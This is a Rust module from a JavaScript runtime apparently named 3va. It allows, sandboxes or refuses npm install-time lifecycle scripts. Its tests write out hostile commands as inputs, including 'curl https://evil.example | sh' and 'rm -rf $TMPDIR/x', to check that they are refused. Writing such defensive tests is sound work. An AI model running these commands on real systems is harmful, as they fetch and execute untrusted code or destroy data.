// SPDX-License-Identifier: MIT
// Copyright (c) 3va contributors

//! Lifecycle scripts (`preinstall` / `install` / `postinstall`).
//!
//! 3va's founding guarantee is that a dependency never runs code at install
//! time. That guarantee is why `better-sqlite3`, `sharp`, `bcrypt` and Prisma
//! do not work out of the box, and it is not a guarantee we are going to
//! quietly drop. What changes here is that opting in is now *possible* and
//! *auditable*, instead of being either impossible or all-or-nothing via
//! `3VA_ALLOW_SCRIPTS=1`.
//!
//! Three rules, in order of precedence:
//!
//! 1. **Not allowlisted → never runs.** The allowlist is the project's
//!    `"3va": { "onlyBuiltDependencies": [...] }`, plus pnpm's and Bun's
//!    spellings. `3VA_ALLOW_SCRIPTS=1` alone no longer runs anything: a
//!    process-wide env var is not a reviewable decision.
//! 2. **A script that is just a JavaScript file runs inside the sandbox.**
//!    `"postinstall": "node install.js"` and the very common
//!    `"install": "esbuild"` shape both resolve to a JS entry file, so 3va
//!    re-enters its own runtime on it. The script gets exactly the permissions
//!    its own `"3va".permissions` scope declares, and nothing else — a
//!    downloader that needs `--allow-net` fails closed and says so.
//! 3. **Anything else (a compound shell command) is refused** with the exact
//!    declaration needed to allow it. The alternative — handing `sh -c` a
//!    string from a third-party package — is the thing the philosophy exists
//!    to prevent, and allowlisting a package is not consent to a shape of
//!    command nobody has read.

use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Outcome {
    /// The package has no lifecycle script.
    None,
    /// Ran inside the sandbox, exit 0.
    Ran,
    /// Ran inside the sandbox, non-zero exit.
    Failed(String),
    /// Not on the allowlist.
    NotAllowed,
    /// A compound shell command — refused, never handed to a shell.
    Refused(String),
    /// Could not classify or launch.
    Unavailable(String),
}

#[derive(Debug, Clone)]
pub struct Plan {
    pub command: String,
    /// A single `node`-style invocation of a JS file — safe to sandbox.
    pub js_entry: Option<PathBuf>,
}

/// A lifecycle command is "simple" when it is one program with plain
/// arguments: no shell metacharacters, no chaining, no substitution.
fn is_simple_command(command: &str) -> bool {
    const SHELL_METACHARACTERS: &[char] = &[
        '|', '&', ';', '<', '>', '(', ')', '`', '$', '*', '?', '\n', '\r', '{', '}', '!', '#', '~',
    ];
    !command.contains(SHELL_METACHARACTERS)
}

/// Split a simple command into program and arguments, honouring single and
/// double quotes. Anything we cannot split confidently returns `None`.
fn split_args(command: &str) -> Option<Vec<String>> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut has_token = false;
    for ch in command.chars() {
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => current.push(ch),
            None if ch == '\'' || ch == '"' => {
                quote = Some(ch);
                has_token = true;
            }
            None if ch.is_whitespace() => {
                if has_token {
                    out.push(std::mem::take(&mut current));
                    has_token = false;
                }
            }
            None => {
                current.push(ch);
                has_token = true;
            }
        }
    }
    if quote.is_some() {
        return None;
    }
    if has_token {
        out.push(current);
    }
    if out.is_empty() { None } else { Some(out) }
}

/// The JS file a simple lifecycle command ultimately runs, if any.
///
/// Recognises the two shapes that cover almost every real build script:
/// `node <file>`, and a bare command that resolves to a `.bin` entry inside
/// this package. Anything with an interpreter flag we do not model
/// (`node --experimental-x install.js`) is left as a shell command, which the
/// caller refuses.
pub fn classify(package_dir: &Path, command: &str) -> Plan {
    let trimmed = command.trim();
    if !is_simple_command(trimmed) {
        return Plan {
            command: trimmed.to_string(),
            js_entry: None,
        };
    }
    let Some(args) = split_args(trimmed) else {
        return Plan {
            command: trimmed.to_string(),
            js_entry: None,
        };
    };
    let (program, rest) = args.split_first().expect("args is non-empty");

    // `node <file>`. A second argument could be a flag we do not model, and
    // passing it through would mean guessing at the script's behaviour, so the
    // bare form is the only one we re-enter.
    if program == "node" && rest.len() == 1 {
        let entry = package_dir.join(&rest[0]);
        if entry.is_file() {
            return Plan {
                command: trimmed.to_string(),
                js_entry: Some(entry),
            };
        }
    }

    // `<bin> [args]` where <bin> is one of this package's own bin names.
    let manifest: serde_json::Value = std::fs::read_to_string(package_dir.join("package.json"))
        .ok()
        .and_then(|c| serde_json::from_str(&c).ok())
        .unwrap_or(serde_json::Value::Null);
    let self_name = manifest
        .get("name")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .or_else(|| {
            package_dir
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
        })
        .unwrap_or_default();
    let bins = crate::bins::bin_entries(&manifest, &self_name);
    for (name, rel) in bins {
        if &name == program {
            let entry = package_dir.join(rel);
            if entry.is_file() && crate::bins::is_javascript_entry(&entry) {
                return Plan {
                    command: trimmed.to_string(),
                    js_entry: Some(entry),
                };
            }
        }
    }

    Plan {
        command: trimmed.to_string(),
        js_entry: None,
    }
}

/// The 3va executable to re-enter for a sandboxed script.
fn self_exe() -> Option<PathBuf> {
    std::env::current_exe().ok()
}

/// Extra arguments the sandboxed run needs so the script behaves like it would
/// under `npm run`: the package directory as cwd, and the lifecycle phase in
/// `npm_lifecycle_event` so packages that branch on it still work.
fn script_env(phase: &str, package_dir: &Path) -> Vec<(String, String)> {
    vec![
        ("npm_lifecycle_event".to_string(), phase.to_string()),
        ("npm_lifecycle_script".to_string(), String::new()),
        (
            "npm_package_json".to_string(),
            package_dir
                .join("package.json")
                .to_string_lossy()
                .to_string(),
        ),
        ("npm_config_yes".to_string(), "true".to_string()),
    ]
}

/// Run one lifecycle script under the policy described at the module level.
///
/// `sandbox_argv` is the trailing flag list for the re-entered 3va process
/// (built from the package's own declared permissions by the caller).
pub fn run(
    package_dir: &Path,
    pkg_name: &str,
    version: &str,
    phase: &'static str,
    command: &str,
    allowlisted: bool,
    sandbox_argv: &[String],
) -> Outcome {
    let plan = classify(package_dir, command);
    let label = format!("{pkg_name}@{version} {phase}");

    if !allowlisted {
        return Outcome::NotAllowed;
    }

    let Some(entry) = plan.js_entry else {
        return Outcome::Refused(format!(
            "{label}: \"{command}\" is a shell command, not a single JavaScript \
             entry point. 3va will not hand a package-authored string to a shell, \
             even for an allowlisted package. Run it yourself once, then pin the \
             result in the project's \"3va\" block."
        ));
    };

    let Some(exe) = self_exe() else {
        return Outcome::Unavailable(format!("{label}: cannot locate the 3va binary"));
    };

    let mut cmd = Command::new(exe);
    cmd.arg("run").arg(&entry);
    // The script needs to write inside its own package directory, which is
    // exactly the grant the caller derived from the package's declared scope.
    for a in sandbox_argv {
        cmd.arg(a);
    }
    cmd.env_clear();
    for (k, v) in script_env(phase, package_dir) {
        if !v.is_empty() {
            cmd.env(k, v);
        }
    }
    cmd.current_dir(package_dir);

    match cmd.output() {
        Ok(out) if out.status.success() => Outcome::Ran,
        Ok(out) => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            Outcome::Failed(format!(
                "{label} exited with {}: {}",
                out.status
                    .code()
                    .map(|c| c.to_string())
                    .unwrap_or_else(|| "signal".into()),
                stderr
                    .trim()
                    .lines()
                    .take(8)
                    .collect::<Vec<_>>()
                    .join(" / ")
            ))
        }
        Err(e) => Outcome::Unavailable(format!("{label}: {e}")),
    }
}

/// Every lifecycle script a manifest declares, in execution order.
pub fn declared_scripts(manifest: &serde_json::Value) -> Vec<(&'static str, String)> {
    const PHASES: [&str; 3] = ["preinstall", "install", "postinstall"];
    let Some(scripts) = manifest.get("scripts").and_then(|s| s.as_object()) else {
        return Vec::new();
    };
    PHASES
        .into_iter()
        .filter_map(|p| {
            scripts
                .get(p)
                .and_then(|v| v.as_str())
                .map(|s| (p, s.to_string()))
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn compound_commands_are_never_classified_as_js() {
        for cmd in [
            "node a.js && node b.js",
            "curl x | sh",
            "node a.js > out.txt",
            "cd .. && node install.js",
            "rm -rf $TMPDIR/x",
        ] {
            assert!(
                classify(Path::new("/tmp"), cmd).js_entry.is_none(),
                "{cmd} should not be classified as a JS entry"
            );
        }
    }

    #[test]
    fn node_with_a_file_is_a_js_entry() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("install.js"), "//").unwrap();
        let plan = classify(dir.path(), "node install.js");
        assert_eq!(plan.js_entry, Some(dir.path().join("install.js")));
    }

    #[test]
    fn node_with_flags_is_not_claimed() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("install.js"), "//").unwrap();
        // Two args after `node` means we are guessing at flags; refuse.
        assert!(
            classify(dir.path(), "node --no-warnings install.js")
                .js_entry
                .is_none()
        );
    }

    #[test]
    fn a_package_bin_is_a_js_entry() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("bin")).unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"esbuild","version":"0.24.0","bin":{"esbuild":"bin/esbuild"}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("bin/esbuild"), "#!/usr/bin/env node\n").unwrap();
        let plan = classify(dir.path(), "esbuild");
        assert!(plan.js_entry.is_some());
    }

    #[test]
    fn a_non_js_bin_is_not_sandboxed() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"tool","bin":{"tool":"bin/tool"}}"#,
        )
        .unwrap();
        std::fs::create_dir_all(dir.path().join("bin")).unwrap();
        std::fs::write(dir.path().join("bin/tool"), "\x7fELF").unwrap();
        assert!(classify(dir.path(), "tool").js_entry.is_none());
    }

    #[test]
    fn split_args_handles_quotes() {
        assert_eq!(
            split_args("node install.js").unwrap(),
            vec!["node", "install.js"]
        );
        assert_eq!(
            split_args("node 'my file.js'").unwrap(),
            vec!["node", "my file.js"]
        );
        assert!(split_args("node \"unterminated").is_none());
    }

    #[test]
    fn declared_scripts_are_in_lifecycle_order() {
        let m = serde_json::json!({"scripts": {
            "postinstall": "node p.js",
            "preinstall": "node q.js",
            "test": "jest"
        }});
        let s = declared_scripts(&m);
        assert_eq!(s.len(), 2);
        assert_eq!(s[0].0, "preinstall");
        assert_eq!(s[1].0, "postinstall");
    }

    #[test]
    fn an_unlisted_package_never_runs() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("install.js"), "process.exit(1)").unwrap();
        let out = run(
            dir.path(),
            "evil",
            "1.0.0",
            "postinstall",
            "node install.js",
            false,
            &[],
        );
        assert_eq!(out, Outcome::NotAllowed);
    }

    #[test]
    fn an_allowlisted_shell_command_is_refused_with_a_reason() {
        let dir = tempfile::tempdir().unwrap();
        let out = run(
            dir.path(),
            "pkg",
            "1.0.0",
            "postinstall",
            "curl https://evil.example | sh",
            true,
            &[],
        );
        match out {
            Outcome::Refused(msg) => {
                assert!(msg.contains("shell"), "{msg}");
            }
            other => panic!("expected Refused, got {other:?}"),
        }
    }
}

/// One installed package that ships install-time scripts.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptPackage {
    pub name: String,
    pub version: String,
    /// `preinstall` / `install` / `postinstall`, in that order.
    pub phases: Vec<&'static str>,
    /// Named in the project's `"3va".onlyBuiltDependencies`.
    pub allowlisted: bool,
}

/// Every package directly under `project_root/node_modules` (scoped ones
/// included) that declares an install-time script — what `3va doctor
/// --compat` reports. 3va never runs these unless allowlisted.
pub fn packages_with_install_scripts(project_root: &Path) -> Vec<ScriptPackage> {
    let manifest: Option<serde_json::Value> =
        std::fs::read_to_string(project_root.join("package.json"))
            .ok()
            .and_then(|c| serde_json::from_str(&c).ok());
    let trust = crate::trust::TrustPolicy::from_manifest_or_empty(manifest.as_ref());

    let node_modules = project_root.join("node_modules");
    let mut dirs = Vec::new();
    for entry in std::fs::read_dir(&node_modules)
        .into_iter()
        .flatten()
        .flatten()
    {
        let name = entry.file_name().to_string_lossy().into_owned();
        if name.starts_with('.') {
            continue;
        }
        if name.starts_with('@') {
            for inner in std::fs::read_dir(entry.path())
                .into_iter()
                .flatten()
                .flatten()
            {
                dirs.push(inner.path());
            }
        } else {
            dirs.push(entry.path());
        }
    }

    let mut out: Vec<ScriptPackage> = dirs
        .iter()
        .filter_map(|dir| {
            let m: serde_json::Value =
                serde_json::from_str(&std::fs::read_to_string(dir.join("package.json")).ok()?)
                    .ok()?;
            let phases: Vec<&'static str> = declared_scripts(&m)
                .into_iter()
                .filter(|(_, s)| !s.trim().is_empty())
                .map(|(p, _)| p)
                .collect();
            if phases.is_empty() {
                return None;
            }
            let name = m["name"].as_str()?.to_string();
            Some(ScriptPackage {
                allowlisted: trust.allows_lifecycle(&name),
                version: m["version"].as_str().unwrap_or("?").to_string(),
                name,
                phases,
            })
        })
        .collect();
    out.sort_by(|a, b| a.name.cmp(&b.name));
    out
}

#[cfg(test)]
mod install_scripts_report_tests {
    use super::*;

    #[test]
    fn lists_packages_with_install_scripts_and_their_allowlist_status() {
        let root = tempfile::tempdir().unwrap();
        let write = |rel: &str, json: &str| {
            let dir = root.path().join(rel);
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("package.json"), json).unwrap();
        };
        write("", r#"{"3va":{"onlyBuiltDependencies":["esbuild"]}}"#);
        write(
            "node_modules/esbuild",
            r#"{"name":"esbuild","version":"0.28.2","scripts":{"postinstall":"node install.js"}}"#,
        );
        write(
            "node_modules/@scope/native",
            r#"{"name":"@scope/native","version":"1.0.0","scripts":{"install":"node-gyp rebuild"}}"#,
        );
        write(
            "node_modules/plain",
            r#"{"name":"plain","version":"1.0.0","scripts":{"test":"x"}}"#,
        );

        let report = packages_with_install_scripts(root.path());
        assert_eq!(
            report,
            vec![
                ScriptPackage {
                    name: "@scope/native".into(),
                    version: "1.0.0".into(),
                    phases: vec!["install"],
                    allowlisted: false,
                },
                ScriptPackage {
                    name: "esbuild".into(),
                    version: "0.28.2".into(),
                    phases: vec!["postinstall"],
                    allowlisted: true,
                },
            ]
        );
    }
}
